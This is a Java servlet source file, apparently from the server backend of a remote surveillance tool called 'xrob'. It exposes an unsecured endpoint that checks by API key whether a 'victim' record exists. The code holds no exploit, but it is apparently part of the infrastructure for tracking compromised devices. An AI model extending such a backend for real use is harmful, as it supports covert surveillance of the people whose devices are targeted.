package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.utils.APIResponse;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Created by shifar on 12/10/16.
 */
@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/isVictimExist"})
public class isVictimExistServlet extends AdvancedBaseServlet {

    @Override
    protected boolean isSecureServlet() {
        return false;
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{Victims.COLUMN_API_KEY};
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String apiKey = getStringParameter(Victims.COLUMN_API_KEY);
        final boolean isVictimExist = Victims.getInstance().get(Victims.COLUMN_API_KEY, apiKey) != null;

        if (isVictimExist) {
            getWriter().write(new APIResponse("Victim exists", null).getResponse());
        } else {
            getWriter().write(new APIResponse("Victim doesn't exists.").getResponse());
        }

    }
}
